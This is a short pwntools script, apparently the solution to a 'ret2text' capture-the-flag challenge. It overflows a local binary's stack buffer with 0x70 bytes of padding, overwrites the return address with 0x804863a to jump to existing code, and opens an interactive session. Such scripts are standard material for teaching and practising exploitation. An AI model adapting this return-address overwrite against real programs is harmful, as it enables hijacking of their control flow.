from pwn import *

sh = process('./ret2text')
target = 0x804863a
sh.sendline(b'A' * (0x70) + p32(target))
sh.interactive()